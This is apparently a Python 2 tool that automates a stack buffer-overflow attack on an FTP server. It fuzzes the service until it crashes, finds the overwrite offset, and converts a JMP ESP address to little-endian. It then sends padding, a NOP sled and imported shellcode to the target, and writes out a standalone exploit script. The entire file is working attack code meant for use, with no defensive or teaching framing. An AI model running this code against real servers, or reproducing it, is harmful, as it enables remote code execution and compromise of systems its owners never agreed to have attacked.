#!/usr/bin/env python2


import random
import string
import socket 
import time
from shell_code import shell_code 
import fileinput
from Banner import *
import shutil

W='\033[0m'     
R='\033[31m'    
G='\033[0;32m'  
O='\33[37m'     
B='\033[34m'    
P= '\033[35m'   
Y="\033[1;33m"   

class Buffer_Over():
    
     def __init__(self):
            global W
            global R
            global G
            global O
            global B
            global P
            global Y          
            time.sleep(2)
            print Y+"\n[A]"+W+R+"* Buffer_Helper Start Target FTP Server Mode  * "+W+Y+"[C]"+W
            self.ip_port()
            self.Fuzzing__()
            self.string_ramdon()
            self.connect_servser()
            self.Option_return()
            self._hexadecimal() 
            self.little_endian()        
            self.attack_all()
            self.auto_write()
     def ip_port(self):
            try:
                self.server_ip=str(raw_input(O+"\n[+]"+W+B+"Server Ip : "+W))
                time.sleep(2)
                self.server_port=int(raw_input(O+"\n[+]"+W+B+"Server Port :"+W)) 
            except Exception:
                print Y+"\n[#]"+W+R+"Please Check Ip and the Port" +W+Y+"[#]"+W 
                return  self.ip_port()    
            except KeyboardInterrupt:
                print Banner
                exit()
                				
     def Fuzzing__(self):       				
          try:                  
                self.Fuz_skip = 's'.lower() 
                self.Fuz_OPt  = "y".lower()  
                time.sleep(2)           
                print O+"\n[F]"+W+Y+" Fuzzing Option "+W+O+"[?]"+W
                time.sleep(2) 
                self.Fuzzing_in = str(raw_input(O+"\n[$]"+W+B+"To Start Fuzzing Enter" +W+R+"'Y'" +W+B+ "To skip Fuzzing Enter" +W+R+"'S'"+W+B+' : '+W))               
                if self.Fuzzing_in ==self.Fuz_skip and len(self.Fuzzing_in)==1:
                     pass
                
                elif self.Fuzzing_in ==self.Fuz_OPt and len(self.Fuzzing_in)==1:
                    String = "A"
		    Fuzzer = 100
		    print O+"\n>>>>"+W+R+"Fuzzing in process "+W 
		    try:
		          try:
		              while True: 
		                    Fuzzing_sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
			            Fuzzing_sock.settimeout(2)
				    Fuzzing_sock.connect((self.server_ip,self.server_port))
				    Fuzzing_sock.recv(1023)	       	      
				    Buffer=String*Fuzzer
				    Fuzzing_sock.send(Buffer+'\n\r')
				    time.sleep(1)
				    Fuzzing_sock.close()
				    length=(int(len(Buffer)))
				    Fuzzer +=100
			  except:
		             if  Fuzzer > 100:                           
                                 print O+"\n>>>>>"+W+P+"Fuzzing Stop at " +W+Y+str(length)+W+ R+ " Characters"+W 
                             else:
                               print Y+"\n[+]"+W+R+"String Pattern NOT Generated :"+W 
                               time.sleep(1)
                               print Y+"\n[+]"+W+B+"service is down "+W 
                               time.sleep(1)
                               print  Banner
                               exit()   
		    except NameError:
                             print O+"\n***_***_"+W+R+"[::"+W+Y+"Fuzzing NOT Start"+W+R+"::'Connection Error :::::']"+W+O+"***_***"+W
			     self.ip_port()
			     self.Fuzzing__()	
	            try:
                        input= raw_input(O+"\n[]>>>>>>"+W+R+"Please Restart the Application then Press any key to Continue"+W+O+"<<<<<<<[]"+W)
                    except NameError:
                           pass	                                          
                    self.Random_String = "".join(random.choice(string.ascii_letters)for i in range(int(length) )).lower()  
                    self.Random_String = bytearray(self.Random_String)
                    time.sleep(2)
		    print Y+"\n[+]"+W+R+"String Pattern is Generated in length :"+W,len(self.Random_String )#,"\n\n",(self.Random_String).strip()
                    time.sleep(2)  
                    if self.Random_String  > 0:
                           self.connect_servser() 
                           self.Option_return()
                           self._hexadecimal() 
                           self.little_endian()        
                           self.attack_all()
                           self.auto_write()                                                                                                                                                             	                    
	        else:         
	           time.sleep(2)    
                   print Y+"\n[-]"+W+R+"please Enter "+W+B+"'Y'"+W+R+"or"+W+B+"'S'"+W+Y+" [-]"+W 
                   return self.Fuzzing__()             
          except KeyboardInterrupt:
                    print  Banner
                    exit()
     def string_ramdon(self):        
             try:                      
	 	    Requst_String = int (raw_input(O+"\n[+]"+W+B+"Enter the length of Pattern :"+W))
		    time.sleep(2)
		    self.Random_String = "".join(random.choice(string.ascii_letters)for i in range(Requst_String )).lower()  
                    self.Random_String = bytearray(self.Random_String)
		    print Y+"\n[+]"+W+R+"String Pattern is Generated in length :"+W,len(self.Random_String )#,"\n\n",(self.Random_String).strip()
             except Exception:
                    time.sleep(2)
                    print Y+"\n[()]"+W+R+"Check input integer Required"+W+Y +"[()]"+W
                    return self.string_ramdon()		 
             except KeyboardInterrupt:
                    print  Banner
                    exit()                 		 
 
     def connect_servser(self):
       
          while True:
	       try:
	            socket_1= socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		    socket_1.connect((self.server_ip,self.server_port))
		    socket_1.settimeout(3)
		    data = socket_1.recv(1023)
		    if socket_1.send( self.Random_String +'\r\n'):
		       time.sleep(2)
	      	       print Y+"\n[+]"+W+R+"Data Send Successful"+W+Y+"...!!!"+W
		       socket_1.close()
		       break 
	            else:
	                  print Y+"\n[(!)]"+W+R+" Connection is Down Socket.Error"+W+Y+"[(!)]"+W
	                  time.sleep(2)
	                  return self.ip_port()
	       except socket.error, exc:

	            print O+"\n***_***_"+W+R+"[:::::'Connection Error :::::']"+W+O+"+***_***"+W
	            time.sleep(2)
	            print O+"\n[(!)]"+W+Y+"Connection is Down >> Exception Socket.Error"+W+O+" :"+W +R+"%s\n" %exc+W
		    self.ip_port()
		    continue
               except KeyboardInterrupt:
                    print  Banner
                    exit()
     def Option_return(self):
       
           try:
               continue_1   = "c".lower()            
               return_back  = "b".lower()
               op_sel = str(raw_input(Y+"\n[<>]"+W+R+"To Continue Press "+W+B+"C "+W+R +"To Return Back Press "+W+B+" B : "+W)).lower()
               if op_sel== continue_1 and  len(op_sel)==1:
                    pass
                    
               elif op_sel ==return_back and len(op_sel)==1:
                    self.string_ramdon()
                    self.connect_servser()
                    self.Option_return()
               else:
                  print Y+"\n[-]"+W+R+"Please Enter "+W+B+"C"+W+R+"or"+W+B+" B"+W+Y+" [-]"+W 
                  self.Option_return()
           except KeyboardInterrupt:
                   print  Banner
                   exit()
                               
     def _hexadecimal(self):
                                                                                   
          while True:
                 try: 
		    self.hexadecimal =str(raw_input(O+"\n[+]"+W+B+"Enter Hexadecimal Crach address: "+W)).upper()
                    self.ASCII1 ="".join(reversed([self.hexadecimal[i:i+2] for i in range(0, len(self.hexadecimal), 2)]))                
		    self.ASCII = ''.join(chr(int(self.ASCII1[i:i+2], 16)) for i in range(0, len(self.ASCII1), 2))
		    if  self.ASCII in  self.Random_String and len(self.ASCII)==4:
		       time.sleep(2)
		       print Y+"\n[+]"+W+P+"The ASCII Value  is "+W+B+": "+W,R+self.ASCII+W
		       time.sleep(2)
		       self.location = self.Random_String.find(self.ASCII)		       
		       print Y+"\n[+]"+W+P+"Exact Satch at Offset"+W+B+" : "+W,self.location	              
                       break
		    else:
	               print Y+"\n[(*)]"+W+R+"THE VALUE  OF THE ADDRESS Not FOUND  IN OUR STRING"+W+Y+"[(*)] "+W
	               time.sleep(2)
	               return self._hexadecimal() 
	                
	         except Exception:
	               print Y+"\n[(*)]"+W+R+"THE VALUE  OF THE ADDRESS Not FOUND "+W+Y+"[(*)] "+W  
	               return self._hexadecimal()                  
		     
	        
                 except KeyboardInterrupt:
                       print  Banner
                       exit() 
         
     def little_endian(self):       
               try:
                    jump= str(raw_input(O+"\n[+]"+W+B+" Enter JMP ESP addrsss HEX  : "+W)).upper()
                    if len(jump) < 4 :
                        print Y+"\n[(*)]"+W+R+"JMP ESP is Required "+W+Y+"[(*)] "+W  
	                return self.little_endian()  
	            else:
	               pass             
                    time.sleep(2)
                    self.jump_address = "".join(reversed([jump[i:i+2] for i in range(0, len(jump), 2)]))
                    self.display =self.jump_address# for print olnly
                    self.display = " ".join('\\x%s'%self.display[i:i+2] for i in range(0, len(self.display), 2))
                    self.display= self.display.replace(" ", "")
                    time.sleep(2)
                    self.jump_address = ('0'*(len(self.jump_address) % 2) +self.jump_address).decode('hex') 
                    print Y+"\n[+]"+W+P+"little endian JMP ESP  is "+W+B+": "+W,R+self.display+W
               except Exception:
	               print Y+"\n[(*)]"+W+R+"TypeError: Non-hexadecimal digit found "+W+Y+"[(*)] "+W  
	               return self.little_endian()                       
               except KeyboardInterrupt:
                    print  Banner
                    exit()
                                
     def attack_all(self):
	     
	       try: 	                      
                   socket_2 =socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                   Start_string = self.location*"A"        
                   self.NO_Operation = len(self.Random_String) - self.location  - len( self.jump_address)
                   self.NO_Operation =self.NO_Operation*"\x90"
                   self.count = self.NO_Operation.count("\x90")    
                   attack = Start_string+self.jump_address+ self.NO_Operation +shell_code 
                   time.sleep(2)
                   print Y+'\n[+]'+W+B+' attack'+W+O+' ='+W,len(Start_string),B+'of'+W+R+ " A "+W+O+' + '+W+B+\
                   ' JMP ESP ='+W,Y+ self.display+W ,O+'+'+W,self.NO_Operation.count("\x90"),B+'of'+W+R+'("\\x90")'+W+O +'+'+W+P+' shell code'+W
                   time.sleep(2)
                   print Y+"\n[+]"+W+R+"Conncet Server Ip "+W+O+ " : "+W, P+self.server_ip+W
                   time.sleep(2)
                   print Y+"\n[+]"+W+R+"Conncet Server Port "+W+O+"  : "+W, self.server_port
                   socket_2.settimeout(8)  
                   socket_2.connect((self.server_ip,self.server_port))      
                   time.sleep(2) 
                   self.data_recv  = socket_2.recv(1024)
                   if socket_2.send( attack + '\r\n'):
                         print B +"\n[+]"+W+R+"WE READY TO ATTACK !!"+W+B+"[+]"+W 
                         time.sleep(2)
                         print Y+"\n[+]"+W+R+"________________Expolit Done _______________ "+W+B+"***!!!"+W   
                         socket_2.close()
               except socket.error, exc :
                         print O+"\n***_***_"+W+R+"[:::::'Connection Error :::::']"+W+O+"+***_***"+W
                         time.sleep(2)
                         print R+"\n::::::The Connection Down Please  Check FTP_SERVER NOT ONLINE :::: "+W
                         time.sleep(2)    
                         self.little_endian()        
                         self.attack_all()
               except KeyboardInterrupt:
                   print  Banner
                   exit()  
                   
     def auto_write(self): 
              
                try:                
                  shell =shell_code.encode("hex")
                  shell1= "".join("\\x%s"%shell[i:i+2] for i in range(0, len(shell), 2))
                  self.shell_code= "".join('\n"%s"'%shell1[i:i+56] for i in range(0, len(shell1),56))
                  copy_format= shutil.copy("./FTP.Server_payload.txt","./FTP.Server_payload.py") 
                     
                  file="./FTP.Server_payload.py"
                  for line in fileinput.FileInput(file,inplace=1):
	                if '# application name :'in line:
		            line = line.rstrip()
		            line = line.replace(line,line+ self.data_recv +'\n')
				 
	                if '_Offset_Byte  =  "A"*'in line:
		            line = line.rstrip()
		            line = line.replace(line,line+ str(self.location)+'\n')
				 
		        if '_JMP_ESP      ='in line:
		            line = line.rstrip()
		            line = line.replace(line,line+'"'+ self.display+'"'+'\n')
				 
	                if '_NO_OPT       = "\\x90"'in line:
		            line = line.rstrip()
		            line = line.replace(line,line+ str(self.count) +'\n')
		        if '_Shell_Code   = ('in line:
		             line = line.rstrip()
		             line = line.replace(line,line+ self.shell_code+ ')'+'\n')
			     
		        if 'ip_address ='in line:
		            line = line.rstrip()
			    line = line.replace(line,line+'"'+self.server_ip+'"'+"\n")
				 
		        if 'connect_Port ='in line:
		            line = line.rstrip()
		            line = line.replace(line,line+ str(self.server_port)+'\n')  
					   
		        print line,
		        
                  time.sleep(2)
		  print O+"\n <<<<>>>>>>"+W+R+"The Final Process of this Exploit Written in the File"+W+Y+"'FTP.Server_Payload.py'"+W+O+"<<<>>>> "+W 
		  time.sleep(2)     
                  print   Banner
                  exit() 
                except KeyboardInterrupt:    
                     print   Banner                              	
                     exit()

		          
if __name__ == '__main__':
   Buffer_Over()





